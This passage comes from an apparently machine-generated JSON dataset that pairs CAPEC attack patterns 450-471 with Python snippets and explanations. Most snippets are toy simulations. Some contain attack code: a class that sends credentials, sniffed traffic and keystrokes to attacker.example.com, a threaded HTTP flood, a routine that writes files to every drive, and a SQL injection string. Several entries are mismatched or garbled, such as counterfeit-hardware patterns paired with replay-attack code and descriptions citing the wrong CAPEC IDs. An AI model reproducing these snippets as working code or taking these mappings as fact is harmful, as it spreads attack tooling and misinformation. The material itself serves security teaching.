        "code_snippet": "import os\nimport shutil\n\n# CWE-506: Embedded Malicious Code\n# This function simulates a benign file copy operation but embeds malicious code\n# that will execute when the file is copied to a USB stick.\ndef copy_with_malware(src, dst):\n    try:\n        # CWE-67: Improper Handling of Windows Device Names\n        if 'AUX' in dst or 'CON' in dst:\n            raise ValueError('Invalid device name in destination path')\n        \n        # Copy the file to the destination\n        shutil.copy(src, dst)\n        \n        # CWE-507: Trojan Horse\n        # Embed malicious code that will execute when the file is accessed\n        with open(dst, 'a') as f:\n            f.write('\\n# Malicious code\\n')\n            f.write('os.system(\"echo Malicious code executed\")\\n')\n        \n        print(f'File copied to {dst} with embedded malware.')\n    except Exception as e:\n        print(f'Error: {e}')\n\n# Example usage\ncopy_with_malware('example.txt', 'D:\\example.txt')",
        "description": "This Python code snippet demonstrates a simulated attack where a seemingly benign file copy operation embeds malicious code into the destination file. The function `copy_with_malware` takes a source file path and a destination file path as arguments. It first checks for improper handling of Windows device names (CWE-67) and raises an error if such names are detected. The file is then copied to the destination, and malicious code is appended to the file (CWE-506 and CWE-507). When the file is accessed, the malicious code will execute, simulating a Trojan Horse attack. This represents the main idea of CAPEC-448, where malware is propagated via a USB stick."
    },
    {
        "capec_id": "450",
        "capec_name": "DEPRECATED: Malware Propagation via USB U3 Autorun",
        "code_snippet": "import os\nimport shutil\n\n# CWE-426: Untrusted Search Path\n# CWE-67: Improper Handling of Windows Device Names\n# CWE-509: Replicating Malicious Code (Virus or Worm)\n\n# Function to replicate malicious code\ndef replicate_malicious_code(source, destination):\n    try:\n        # CWE-67: Improper Handling of Windows Device Names\n        if 'AUX' in destination or 'CON' in destination:\n            raise ValueError('Invalid device name in path')\n        \n        # CWE-426: Untrusted Search Path\n        if not os.path.isabs(destination):\n            destination = os.path.join(os.getcwd(), destination)\n        \n        # Copy the malicious code to the destination\n        shutil.copyfile(source, destination)\n        print(f'Malicious code replicated to {destination}')\n    except Exception as e:\n        print(f'Error replicating malicious code: {e}')\n\n# Example usage\nsource_file = 'malicious_code.py'\ndestination_path = 'C:\\Users\\Public\\malicious_code.py'\nreplicate_malicious_code(source_file, destination_path)",
        "description": "This Python code snippet demonstrates the concept of malware propagation by replicating a malicious file to a specified destination. The function `replicate_malicious_code` takes a source file and a destination path as inputs. It checks for improper handling of Windows device names (CWE-67) and ensures the destination path is absolute to avoid untrusted search paths (CWE-426). If the checks pass, it copies the malicious file to the destination, simulating the replication of malicious code (CWE-509). This embodies the main idea of the deprecated CAPEC pattern, which involves embedding and propagating malicious code."
    },
    {
        "capec_id": "451",
        "capec_name": "DEPRECATED: Malware Propagation via Infected Peripheral Device",
        "code_snippet": "import os\nimport platform\n\n# CWE-589: Call to Non-ubiquitous API\nif platform.system() == 'Windows':\n    import win32api\n    def get_drive_list():\n        drives = win32api.GetLogicalDriveStrings()\n        drives = drives.split('\\000')[:-1]\n        return drives\nelse:\n    def get_drive_list():\n        return os.listdir('/mnt')\n\n# CWE-507: Trojan Horse\n# This function simulates a benign function that also performs a hidden malicious action\n\ndef scan_and_infect():\n    drives = get_drive_list()\n    for drive in drives:\n        # Simulate scanning the drive\n        print(f'Scanning {drive} for malware...')\n        # Hidden malicious action: create a hidden file\n        hidden_file_path = os.path.join(drive, '.hidden_malware')\n        with open(hidden_file_path, 'w') as hidden_file:\n            hidden_file.write('This is a hidden malware file.')\n        print(f'Infected {drive} with hidden malware.')\n\n# CWE-1277: Firmware Not Updateable\n# Simulate a device with non-updateable firmware\nclass Device:\n    def __init__(self, firmware_version):\n        self.firmware_version = firmware_version\n        self.updateable = False\n\n    def check_for_updates(self):\n        if not self.updateable:\n            print('Firmware is not updateable.')\n        else:\n            print('Checking for firmware updates...')\n\n# Example usage\nif __name__ == '__main__':\n    device = Device('1.0')\n    device.check_for_updates()\n    scan_and_infect()",
        "description": "This Python code snippet demonstrates a scenario where malware propagates via infected peripheral devices, embodying the deprecated CAPEC pattern. The code includes vulnerabilities and weaknesses described by related CWEs:\n\n1. **CWE-589: Call to Non-ubiquitous API** - The code uses platform-specific APIs to list drives, which may not be available on all systems, leading to potential inconsistencies.\n2. **CWE-507: Trojan Horse** - The `scan_and_infect` function appears to perform a benign action (scanning drives for malware) but also performs a hidden malicious action (creating a hidden malware file).\n3. **CWE-1277: Firmware Not Updateable** - The `Device` class simulates a device with non-updateable firmware, highlighting the risk of unpatchable vulnerabilities.\n\nThe code is designed to illustrate how malware can propagate through peripheral devices by exploiting these weaknesses."
    },
    {
        "capec_id": "452",
        "capec_name": "Infected Hardware",
        "code_snippet": "import ctypes\n\n# Simulate malicious hardware interaction\nclass MaliciousHardware:\n    def __init__(self):\n        self.registers = [0] * 10  # Simulated hardware registers\n\n    def infect(self):\n        # CWE-506: Embedded Malicious Code\n        self.registers[0] = 0xDEADBEEF  # Malicious payload\n\n    def replicate(self):\n        # CWE-509: Replicating Malicious Code\n        for i in range(1, len(self.registers)):\n            self.registers[i] = self.registers[0]  # Replicate payload\n\n    def access_register(self, index):\n        # CWE-1262: Improper Access Control for Register Interface\n        if index < 0 or index >= len(self.registers):\n            raise ValueError(\"Invalid register index\")\n        return self.registers[index]\n\n    def debug_mode(self):\n        # CWE-1313: Hardware Allows Activation of Test or Debug Logic at Runtime\n        print(\"Debug mode activated\")\n        for i in range(len(self.registers)):\n            self.registers[i] = 0xBADF00D  # Alter hardware state\n\n# Example usage\nhardware = MaliciousHardware()\nhardware.infect()\nhardware.replicate()\nprint(hardware.access_register(0))  # Accessing infected register\nhardware.debug_mode()  # Activating debug mode\nprint(hardware.access_register(0))  # Accessing altered register",
        "description": "This Python code snippet simulates the concept of 'Infected Hardware' by creating a class `MaliciousHardware` that represents a piece of hardware with malicious logic embedded in it. The class includes methods to infect the hardware with a malicious payload (CWE-506), replicate the malicious code across hardware registers (CWE-509), improperly access hardware registers (CWE-1262), and activate debug mode at runtime to alter the hardware state (CWE-1313). The code demonstrates how an adversary might insert and propagate malicious logic within hardware, highlighting the vulnerabilities and potential impacts described in the CAPEC."
    },
    {
        "capec_id": "453",
        "capec_name": "DEPRECATED: Malicious Logic Insertion via Counterfeit Hardware",
        "code_snippet": "import socket\nimport struct\n\n# CWE-294: Authentication Bypass by Capture-replay\n# This code demonstrates a simple capture-replay attack on a network service.\n\n# Function to capture network traffic (simulated)\ndef capture_traffic():\n    # Simulated captured packet (authentication token)\n    captured_packet = struct.pack('!I', 0xdeadbeef)  # Example token\n    return captured_packet\n\n# Function to replay captured traffic\ndef replay_traffic(packet):\n    # Connect to the target server\n    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n        s.connect(('localhost', 9999))\n        s.sendall(packet)\n        response = s.recv(1024)\n        print('Received:', response)\n\n# Capture the traffic\ncaptured_packet = capture_traffic()\n\n# Replay the captured traffic\nreplay_traffic(captured_packet)",
        "description": "This Python code snippet demonstrates a capture-replay attack, which is related to CWE-294: Authentication Bypass by Capture-replay. The code simulates capturing an authentication token from network traffic and then replaying it to a server to bypass authentication. This embodies the main idea of the deprecated CAPEC pattern, which involves malicious logic insertion, by showing how an attacker can exploit a vulnerability in the authentication mechanism to gain unauthorized access."
    },
    {
        "capec_id": "454",
        "capec_name": "DEPRECATED: Modification of Existing Components with Counterfeit Hardware",
        "code_snippet": "class HardwareComponent:\n    def __init__(self, firmware_version):\n        self.firmware_version = firmware_version\n        self.malicious_code = self._embed_malicious_code()\n\n    def _embed_malicious_code(self):\n        # CWE-506: Embedded Malicious Code\n        return \"malicious_function()\"\n\n    def update_firmware(self, new_version):\n        # CWE-1329: Reliance on Component That is Not Updateable\n        if self.firmware_version == '1.0':\n            print(\"Firmware cannot be updated.\")\n        else:\n            self.firmware_version = new_version\n            print(f\"Firmware updated to {new_version}\")\n\n    def undocumented_feature(self):\n        # CWE-1242: Inclusion of Undocumented Features or Chicken Bits\n        print(\"Undocumented feature activated!\")\n\n# Example usage\ncomponent = HardwareComponent('1.0')\ncomponent.update_firmware('2.0')\ncomponent.undocumented_feature()",
        "description": "This Python code snippet represents a hardware component class that embodies the main idea of CAPEC-452: Malicious Logic Insertion into Product Hardware. The class includes a method to embed malicious code (CWE-506), a method to update firmware that fails if the component is not updateable (CWE-1329), and an undocumented feature method (CWE-1242). The code demonstrates how malicious logic can be inserted into hardware, how reliance on non-updateable components can be problematic, and how undocumented features can create security vulnerabilities."
    },
    {
        "capec_id": "455",
        "capec_name": "DEPRECATED: Malicious Logic Insertion via Inclusion of Counterfeit Hardware Components",
        "code_snippet": "import random\n\nclass HardwareComponent:\n    def __init__(self, id, data):\n        self.id = id\n        self.data = data\n        self.malicious = False\n\n    def inject_malicious_code(self):\n        if random.choice([True, False]):\n            self.malicious = True\n            self.data = 'malicious_code'\n\n    def read_data(self):\n        if self.malicious:\n            return 'Error: Malicious code detected'\n        return self.data\n\n# Simulate hardware components\ncomponents = [HardwareComponent(i, f'data_{i}') for i in range(5)]\n\n# Inject malicious code into one of the components\nfor component in components:\n    component.inject_malicious_code()\n\n# Read data from components\nfor component in components:\n    print(f'Component {component.id}: {component.read_data()}')",
        "description": "This Python code snippet simulates the insertion of malicious logic into hardware components, embodying the main idea of the deprecated CAPEC. The `HardwareComponent` class represents a hardware component with an ID and data. The `inject_malicious_code` method randomly decides whether to inject malicious code into the component, changing its data to 'malicious_code' and setting a flag. The `read_data` method checks if the component contains malicious code and returns an error message if it does. The simulation creates multiple hardware components, potentially injects malicious code into them, and then reads their data, demonstrating how malicious logic can be inserted and detected in hardware components. This example also touches on CWE-506 (Embedded Malicious Code) and CWE-1334 (Unauthorized Error Injection Can Degrade Hardware Redundancy) by showing how malicious code can be embedded and how it can affect the system's operation."
    },
    {
        "capec_id": "456",
        "capec_name": "Infected Memory",
        "code_snippet": "import ctypes\n\n# Simulate a protected memory region\nprotected_memory = (ctypes.c_char * 1024).from_buffer(bytearray(1024))\n\n# Simulate an aliased memory region with improper access control\naliased_memory = (ctypes.c_char * 1024).from_buffer(protected_memory)\n\n# Function to write to the aliased memory region\ndef write_to_aliased_memory(data):\n    for i in range(len(data)):\n        aliased_memory[i] = data[i]\n\n# Malicious code writing to the aliased memory region\nmalicious_data = b'MaliciousCode'\nwrite_to_aliased_memory(malicious_data)\n\n# Check the protected memory to see if it was modified\nprint(protected_memory[:len(malicious_data)])",
        "description": "This Python code snippet demonstrates a vulnerability where an adversary can insert malicious logic into a protected memory region by exploiting an aliased memory region with improper access control. The `protected_memory` simulates a protected memory region, while `aliased_memory` is an aliased region that shares the same underlying buffer. The function `write_to_aliased_memory` writes data to the aliased memory, which inadvertently modifies the protected memory. This represents the 'Infected Memory' attack pattern, where malicious logic is inserted into memory regions that should be protected, leveraging weaknesses such as improper access control and overlapping memory regions."
    },
    {
        "capec_id": "457",
        "capec_name": "USB Memory Attacks",
        "code_snippet": "import os\nimport socket\nimport subprocess\n\n# Simulate malicious code embedded in a USB device\nclass MaliciousUSB:\n    def __init__(self):\n        self.payload = 'malicious_payload'\n\n    def execute_payload(self):\n        # Simulate cleartext transmission of sensitive information\n        sensitive_data = 'user_credentials:password123'\n        self.transmit_data(sensitive_data)\n\n    def transmit_data(self, data):\n        # Transmit data over an unencrypted channel\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        s.connect(('attacker.example.com', 8080))\n        s.sendall(data.encode('utf-8'))\n        s.close()\n\n    def sniff_network(self):\n        # Simulate network sniffing\n        sniffed_data = subprocess.check_output(['tcpdump', '-c', '10'])\n        self.transmit_data(sniffed_data.decode('utf-8'))\n\n    def monitor_keystrokes(self):\n        # Simulate keystroke logging\n        keystrokes = 'user typed: hello world'\n        self.transmit_data(keystrokes)\n\n# Simulate the USB being plugged into a system\nusb = MaliciousUSB()\nusb.execute_payload()\nusb.sniff_network()\nusb.monitor_keystrokes()",
        "description": "This Python code snippet simulates a malicious USB device that, when plugged into a system, executes a payload to steal sensitive information. The `MaliciousUSB` class contains methods to execute the payload, transmit data in cleartext, sniff network traffic, and monitor keystrokes. The `execute_payload` method simulates the transmission of sensitive data (e.g., user credentials) in cleartext, representing CWE-319. The `sniff_network` method uses a subprocess to run `tcpdump` and capture network traffic, which is then transmitted in cleartext. The `monitor_keystrokes` method simulates logging keystrokes and transmitting them. This code embodies the main idea of CAPEC-160 (USB Memory Attacks) by demonstrating how a malicious USB device can compromise a system and exfiltrate data via unprotected channels."
    },
    {
        "capec_id": "458",
        "capec_name": "Flash Memory Attacks",
        "code_snippet": "import os\n\n# CWE-1282: Assumed-Immutable Data is Stored in Writable Memory\n# CWE-506: Embedded Malicious Code\n# CWE-1274: Improper Access Control for Volatile Memory Containing Boot Code\n\n# Simulate flashing malicious code into a device's flash memory\nclass FlashMemoryAttack:\n    def __init__(self, flash_memory_path):\n        self.flash_memory_path = flash_memory_path\n\n    def flash_malicious_code(self):\n        # CWE-506: Embedded Malicious Code\n        malicious_code = \"\\x90\\x90\\x90\\x90\"  # NOP sled as a placeholder for malicious payload\n        try:\n            with open(self.flash_memory_path, 'wb') as flash_memory:\n                flash_memory.write(malicious_code)\n            print(\"Malicious code flashed successfully.\")\n        except IOError as e:\n            print(f\"Failed to flash malicious code: {e}\")\n\n# Example usage\nif __name__ == \"__main__\":\n    # CWE-1282: Assumed-Immutable Data is Stored in Writable Memory\n    # Path to the flash memory (simulated)\n    flash_memory_path = \"/tmp/flash_memory.bin\"\n\n    # Create a simulated flash memory file\n    with open(flash_memory_path, 'wb') as f:\n        f.write(b\"\\x00\" * 1024)  # Initialize with zeroes\n\n    # Perform the flash memory attack\n    attack = FlashMemoryAttack(flash_memory_path)\n    attack.flash_malicious_code()",
        "description": "This Python code snippet simulates a flash memory attack, where an adversary inserts malicious logic into a device's flash memory. The `FlashMemoryAttack` class represents the attack mechanism, with a method `flash_malicious_code` that writes a simple malicious payload (a NOP sled) to a specified flash memory path. The code demonstrates CWE-1282 by assuming the flash memory is writable, CWE-506 by embedding malicious code, and CWE-1274 by not implementing any access control for the flash memory. The example usage initializes a simulated flash memory file and performs the attack by flashing the malicious code into it."
    },
    {
        "capec_id": "459",
        "capec_name": "Creating a Rogue Certification Authority Certificate",
        "code_snippet": "import hashlib\nfrom cryptography import x509\nfrom cryptography.hazmat.primitives import hashes\nfrom cryptography.hazmat.primitives.asymmetric import rsa\nfrom cryptography.hazmat.primitives.serialization import Encoding, PrivateFormat, NoEncryption\nfrom cryptography.hazmat.primitives.serialization import load_pem_private_key\nfrom cryptography.hazmat.primitives.asymmetric.padding import PKCS1v15\n\n# Generate RSA keys\nprivate_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)\npublic_key = private_key.public_key()\n\n# Create a certificate signing request (CSR) with weak hash algorithm (MD5)\ncsr = x509.CertificateSigningRequestBuilder().subject_name(x509.Name([\n    x509.NameAttribute(x509.NameOID.COMMON_NAME, u'example.com'),\n])).sign(private_key, hashes.MD5())\n\n# Simulate a trusted CA signing the CSR\nsigned_csr = csr.public_bytes(Encoding.PEM)\n\n# Adversary creates a rogue certificate with the same hash\nrogue_csr = x509.CertificateSigningRequestBuilder().subject_name(x509.Name([\n    x509.NameAttribute(x509.NameOID.COMMON_NAME, u'rogue.com'),\n])).sign(private_key, hashes.MD5())\n\n# Use the signed blob from the trusted CA to create a rogue certificate\nrogue_cert = x509.CertificateBuilder().subject_name(rogue_csr.subject).issuer_name(csr.subject).public_key(public_key).serial_number(x509.random_serial_number()).not_valid_before(x509.datetime.datetime.utcnow()).not_valid_after(x509.datetime.datetime.utcnow() + x509.datetime.timedelta(days=10)).sign(private_key, hashes.MD5())\n\n# Serialize the rogue certificate\nrogue_cert_pem = rogue_cert.public_bytes(Encoding.PEM)\n\nprint(rogue_cert_pem.decode())",
        "description": "This Python code snippet demonstrates the concept of creating a rogue certification authority certificate by exploiting a weak hashing algorithm (MD5). The code generates an RSA key pair and creates a certificate signing request (CSR) using MD5. It simulates a trusted CA signing the CSR. Then, an adversary creates a rogue CSR with the same hash and uses the signed blob from the trusted CA to create a rogue certificate. The rogue certificate appears to be signed by the trusted CA due to the hash collision, embodying the main idea of the CAPEC. The code highlights the vulnerabilities related to the use of broken cryptographic algorithms (CWE-327) and improper certificate validation (CWE-295)."
    },
    {
        "capec_id": "460",
        "capec_name": "HTTP Parameter Pollution (HPP)",
        "code_snippet": "from flask import Flask, request\n\napp = Flask(__name__)\n\n@app.route('/search', methods=['GET', 'POST'])\ndef search():\n    query = request.args.get('query') or request.form.get('query')\n    if query:\n        # Simulate a search operation\n        return f'Search results for: {query}'\n    return 'No query provided'\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet uses the Flask web framework to create a simple web application with a search endpoint that accepts both GET and POST requests. The 'search' function retrieves the 'query' parameter from the request. However, it does not handle cases where multiple 'query' parameters are provided, which can lead to HTTP Parameter Pollution (HPP). An attacker could exploit this by adding duplicate 'query' parameters to manipulate the application's behavior. This example also touches on related CWEs: improper handling of extra parameters (CWE-235), use of GET request method with sensitive query strings (CWE-598), and improper neutralization of input terminators (CWE-147)."
    },
    {
        "capec_id": "461",
        "capec_name": "Web Services API Signature Forgery Leveraging Hash Function Extension Weakness",
        "code_snippet": "import hashlib\n\n# Simulate a weak hash function (e.g., MD5)\ndef weak_hash(data):\n    return hashlib.md5(data.encode()).hexdigest()\n\n# Simulate a web service API that uses a weak hash for authentication\ndef web_service_api(data, provided_hash):\n    secret_token = 'secret'\n    valid_hash = weak_hash(data + secret_token)\n    if provided_hash == valid_hash:\n        return 'Authenticated'\n    else:\n        return 'Authentication Failed'\n\n# Adversary's attack leveraging hash extension weakness\n# Original data and hash\noriginal_data = 'user=admin&timestamp=123456'\noriginal_hash = weak_hash(original_data + 'secret')\n\n# Adversary modifies the data\nmodified_data = 'user=admin&timestamp=123456&role=admin'\n\n# Adversary generates a new hash without knowing the secret token\n# This is a simplified example and does not perform actual hash extension attack\nnew_hash = weak_hash(modified_data + 'secret')\n\n# Call the web service API with modified data and new hash\nresult = web_service_api(modified_data, new_hash)\nprint(result)",
        "description": "This Python code snippet demonstrates a simplified version of a Web Services API Signature Forgery attack leveraging a hash function extension weakness. The web service API uses a weak hash function (MD5) for authentication. An adversary modifies the original data and generates a new hash without knowing the secret token, exploiting the weak hash function. The web service API then incorrectly authenticates the adversary's request. This example highlights the vulnerabilities associated with using weak hash functions (CWE-328) and weak authentication mechanisms (CWE-1390), leading to potential authentication bypass (CWE-290, CWE-305)."
    },
    {
        "capec_id": "462",
        "capec_name": "Cross-Domain Search Timing",
        "code_snippet": "import requests\nimport time\n\n# List of URLs to test\nurls = [\n    'http://example.com/resource1',\n    'http://example.com/resource2',\n    'http://example.com/resource3'\n]\n\n# Function to measure response time\ndef measure_response_time(url):\n    start_time = time.time()\n    response = requests.get(url)\n    end_time = time.time()\n    return end_time - start_time\n\n# Measure and print response times\nfor url in urls:\n    response_time = measure_response_time(url)\n    print(f'Response time for {url}: {response_time} seconds')",
        "description": "This Python code snippet demonstrates a basic implementation of a Cross-Domain Search Timing attack. The script sends HTTP GET requests to a list of URLs and measures the time taken for each request to complete. By analyzing the response times, an attacker can infer information about the server's state or the presence of certain resources, even though they cannot directly read the server's responses due to the same-origin policy. This embodies the main idea of CAPEC-115 (Cross-Domain Search Timing) and relates to CWE-385 (Covert Timing Channel) and CWE-208 (Observable Timing Discrepancy)."
    },
    {
        "capec_id": "463",
        "capec_name": "Padding Oracle Crypto Attack",
        "code_snippet": "from Crypto.Cipher import AES\nfrom Crypto.Util.Padding import pad, unpad\nimport os\n\n# Key and IV generation\nkey = os.urandom(16)\niv = os.urandom(16)\ncipher = AES.new(key, AES.MODE_CBC, iv)\n\n# Encrypting data\nplaintext = b'Secret Message'\npadded_plaintext = pad(plaintext, AES.block_size)\nciphertext = cipher.encrypt(padded_plaintext)\n\n# Decrypting data with padding oracle vulnerability\ntry:\n    decipher = AES.new(key, AES.MODE_CBC, iv)\n    decrypted_padded_plaintext = decipher.decrypt(ciphertext)\n    decrypted_plaintext = unpad(decrypted_padded_plaintext, AES.block_size)\n    print('Decryption successful:', decrypted_plaintext)\nexcept ValueError as e:\n    print('Padding error:', e)",
        "description": "This Python code snippet demonstrates a basic encryption and decryption process using AES in CBC mode, highlighting a padding oracle vulnerability. The code encrypts a plaintext message and then attempts to decrypt it. If the padding is incorrect during decryption, a ValueError is raised, and an error message is printed. This error message can leak information about the padding, which an attacker can exploit to decrypt the ciphertext without knowing the key. This embodies the main idea of the CAPEC by showing how leaking padding error information can be used as an oracle to decrypt data. The related CWEs are represented by the generation of error messages containing sensitive information (CWE-209) and the reliance on encryption without integrity checking (CWE-649)."
    },
    {
        "capec_id": "464",
        "capec_name": "Evercookie",
        "code_snippet": "import os\nimport json\nimport base64\nfrom http.cookies import SimpleCookie\n\n# Simulate multiple storage locations\nstorage_locations = [\n    'local_storage.json',\n    'session_storage.json',\n    'cookie_storage.txt',\n    'flash_storage.txt'\n]\n\n# Function to create an evercookie\ndef create_evercookie(value):\n    encoded_value = base64.b64encode(value.encode()).decode()\n    for location in storage_locations:\n        with open(location, 'w') as f:\n            f.write(encoded_value)\n\n# Function to read the evercookie\ndef read_evercookie():\n    for location in storage_locations:\n        if os.path.exists(location):\n            with open(location, 'r') as f:\n                return base64.b64decode(f.read()).decode()\n    return None\n\n# Function to delete the evercookie\ndef delete_evercookie():\n    for location in storage_locations:\n        if os.path.exists(location):\n            os.remove(location)\n\n# Function to restore the evercookie if any part is still present\ndef restore_evercookie():\n    value = read_evercookie()\n    if value:\n        create_evercookie(value)\n\n# Example usage\ncreate_evercookie('sensitive_data')\ndelete_evercookie()\nrestore_evercookie()\n\n# Simulate cookie usage\ncookie = SimpleCookie()\ncookie['session'] = 'sensitive_data'\nprint(cookie.output())",
        "description": "This Python code snippet demonstrates the concept of an 'evercookie', which is a highly persistent cookie that remains on the user's machine even after attempts to delete it. The code simulates multiple storage locations (local storage, session storage, cookies, and flash storage) to store the cookie data. The `create_evercookie` function encodes the cookie value in base64 and writes it to all storage locations. The `read_evercookie` function reads the cookie value from any available storage location. The `delete_evercookie` function attempts to delete the cookie from all storage locations. The `restore_evercookie` function checks if the cookie exists in any storage location and restores it to all locations if found. This demonstrates the persistence of the evercookie. Additionally, the code includes a simple example of setting a cookie using the `http.cookies` module. The code highlights the vulnerabilities related to persistent cookies containing sensitive information (CWE-539), reliance on cookies without validation (CWE-784, CWE-565), and cleartext storage of sensitive information in a cookie (CWE-315)."
    },
    {
        "capec_id": "465",
        "capec_name": "Transparent Proxy Abuse",
        "code_snippet": "import requests\n\nclass TransparentProxy:\n    def __init__(self, target_url):\n        self.target_url = target_url\n\n    def forward_request(self, client_request):\n        # Forward the client's request to the target URL\n        response = requests.get(self.target_url, headers=client_request.headers)\n        return response\n\n# Example usage\nproxy = TransparentProxy('http://example.com')\nclient_request = requests.Request('GET', 'http://proxy.com', headers={'User-Agent': 'client-browser'})\nresponse = proxy.forward_request(client_request)\nprint(response.content)",
        "description": "This Python code snippet demonstrates a simple transparent proxy that forwards client requests to a target URL. The `TransparentProxy` class takes a target URL as an argument and has a method `forward_request` that forwards the client's request to this target URL. The proxy does not modify the request headers, which can lead to issues such as 'Unintended Proxy or Intermediary' (CWE-441) and 'Inconsistent Interpretation of HTTP Requests' (CWE-444). The proxy also does not remove sensitive information from the request headers, which can lead to 'Improper Removal of Sensitive Information Before Storage or Transfer' (CWE-212). This code embodies the main idea of the CAPEC by showing how a transparent proxy can be implemented and the potential vulnerabilities associated with it."
    },
    {
        "capec_id": "466",
        "capec_name": "Leveraging Active Adversary in the Middle Attacks to Bypass Same Origin Policy",
        "code_snippet": "import requests\n\n# Vulnerable function that does not verify the identity of the endpoint\n# and does not use TLS for secure communication\n\ndef fetch_data(url):\n    response = requests.get(url)\n    return response.text\n\n# Example usage\n# This could be intercepted by an attacker in a MITM position\nnon_sensitive_url = 'http://example.com/data'\ndata = fetch_data(non_sensitive_url)\nprint(data)",
        "description": "This Python code snippet demonstrates a vulnerable function `fetch_data` that fetches data from a given URL without verifying the identity of the endpoint and without using TLS (HTTPS) for secure communication. This makes it susceptible to Man-in-the-Middle (MITM) attacks, especially when the victim is connected to a public WiFi hotspot. An attacker can intercept and manipulate the requests and responses between the victim's browser and the non-sensitive website. This vulnerability aligns with CAPEC-94 and related CWEs, such as CWE-300 (Channel Accessible by Non-Endpoint) and CWE-923 (Improper Restriction of Communication Channel to Intended Endpoints)."
    },
    {
        "capec_id": "467",
        "capec_name": "Cross Site Identification",
        "code_snippet": "import requests\nfrom flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/get_user_info')\ndef get_user_info():\n    social_network_url = 'https://socialnetwork.com/api/user_info'\n    session_cookie = request.cookies.get('session')\n    if session_cookie:\n        headers = {'Cookie': f'session={session_cookie}'}\n        response = requests.get(social_network_url, headers=headers)\n        if response.status_code == 200:\n            user_info = response.json()\n            return render_template_string('<h1>User Info</h1><p>{{ user_info }}</p>', user_info=user_info)\n    return 'Failed to retrieve user info', 400\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a Flask web application that retrieves user information from a social networking site using the user's session cookie. The main idea of the CAPEC (Cross Site Identification) is represented by the code's ability to harvest identifying information about a victim via an active session. The code leverages the session cookie to make an authenticated request to the social networking site's API and retrieves the user's information. This information is then displayed on a web page. The code is vulnerable to several CWEs: CWE-352 (CSRF) as it does not verify the request's origin, CWE-359 (Exposure of Private Personal Information) as it exposes user information without proper authorization, CWE-384 (Session Fixation) as it relies on an existing session cookie, CWE-598 (Use of GET Request Method With Sensitive Query Strings) as it uses GET requests to retrieve sensitive information, and CWE-79 (Cross-site Scripting) as it directly renders user information without proper sanitization."
    },
    {
        "capec_id": "468",
        "capec_name": "Generic Cross-Browser Cross-Domain Theft",
        "code_snippet": "from flask import Flask, request, make_response\n\napp = Flask(__name__)\n\n@app.route('/vulnerable', methods=['GET'])\ndef vulnerable():\n    css_url = request.args.get('css_url')\n    if css_url:\n        response = make_response(f'<link rel=\"stylesheet\" type=\"text/css\" href=\"{css_url}\">')\n        response.headers['Content-Type'] = 'text/html'\n        return response\n    return 'No CSS URL provided', 400\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a vulnerable web application endpoint using Flask. The endpoint '/vulnerable' accepts a 'css_url' parameter from the query string and includes it in a link tag within the HTML response. This can lead to a Generic Cross-Browser Cross-Domain Theft attack as described in the CAPEC. The vulnerability arises because the application does not properly neutralize the input (CWE-79) and directly includes it in the HTML output, allowing an attacker to inject a malicious CSS URL. This can result in the browser sending cookies and other sensitive data to the attacker's domain. The code also highlights improper handling of URL encoding (CWE-177) and inappropriate encoding for the output context (CWE-838), as it does not validate or sanitize the 'css_url' parameter."
    },
    {
        "capec_id": "469",
        "capec_name": "HTTP DoS",
        "code_snippet": "import threading\nimport requests\nimport time\n\n# Target URL\nurl = 'http://example.com'\n\n# Function to perform HTTP DoS attack\ndef http_dos_attack():\n    while True:\n        try:\n            # Open a connection and keep it alive\n            response = requests.get(url, headers={'Connection': 'keep-alive'})\n            time.sleep(1)  # Simulate delay to keep the connection open\n        except Exception as e:\n            print(f'Error: {e}')\n\n# Number of threads to simulate multiple connections\nnum_threads = 100\n\n# Create and start threads\nthreads = []\nfor i in range(num_threads):\n    thread = threading.Thread(target=http_dos_attack)\n    thread.start()\n    threads.append(thread)\n\n# Join threads\nfor thread in threads:\n    thread.join()",
        "description": "This Python code snippet demonstrates a simple HTTP DoS attack by opening multiple HTTP connections to a target URL and keeping them alive indefinitely. The code uses threading to simulate multiple connections, each sending a GET request with the 'Connection: keep-alive' header to keep the session open. This can exhaust the web server's resources, leading to a denial of service. The code embodies the main idea of CAPEC-HTTP DoS by targeting resource depletion weaknesses in web server software. The related CWEs are represented by the lack of resource limits (CWE-770), not releasing resources (CWE-772), and insufficient resource pool (CWE-410)."
    },
    {
        "capec_id": "470",
        "capec_name": "Expanding Control over the Operating System from the Database",
        "code_snippet": "import sqlite3\nimport os\n\n# CWE-89: SQL Injection vulnerability\nuser_input = \"' OR '1'='1\"  # Malicious input\n\n# CWE-250: Execution with Unnecessary Privileges\nconn = sqlite3.connect('example.db')\ncursor = conn.cursor()\n\n# CWE-619: Dangling Database Cursor\ncursor.execute(f\"SELECT * FROM users WHERE username = '{user_input}'\")\n\n# CWE-564: SQL Injection via Hibernate (simulated here with raw SQL)\nfor row in cursor.fetchall():\n    print(row)\n\n# CWE-1313: Simulated hardware debug logic activation (not directly applicable in Python, but shown for context)\nos.system('echo Debug mode activated')\n\n# Exploiting DBMS to execute OS-level command\ncursor.execute(\"SELECT load_extension('libc.so.6')\")\ncursor.execute(\"SELECT system('ls')\")\n\nconn.close()",
        "description": "This Python code snippet demonstrates a scenario where an attacker leverages SQL injection (CWE-89) to gain unauthorized access to a database. The code connects to an SQLite database with unnecessary privileges (CWE-250) and executes a malicious SQL query using user input. The cursor is not properly closed, leading to a dangling cursor (CWE-619). The code also simulates the execution of OS-level commands through the database, representing the main idea of CAPEC-Expanding Control over the Operating System from the Database. Additionally, it includes a simulated activation of debug logic (CWE-1313) to show how hardware features could be misused, although this is not directly applicable in Python."
    },
    {
        "capec_id": "471",
        "capec_name": "Search Order Hijacking",
